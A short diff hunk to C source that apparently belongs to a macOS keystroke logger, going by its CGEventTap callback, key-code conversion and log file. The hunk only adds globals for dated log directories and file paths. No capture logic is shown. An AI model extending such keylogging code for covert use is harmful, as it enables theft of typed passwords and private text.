@@ -8,6 +8,11 @@
 #include <Carbon/Carbon.h>
 
 FILE *logfile = NULL;
+int theday = 550;
+struct tm* tm;
+time_t now = 0;
+char logDirectory[100];
+char logFileLocation[50];
 
 CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
 const char *convertKeyCode(int);
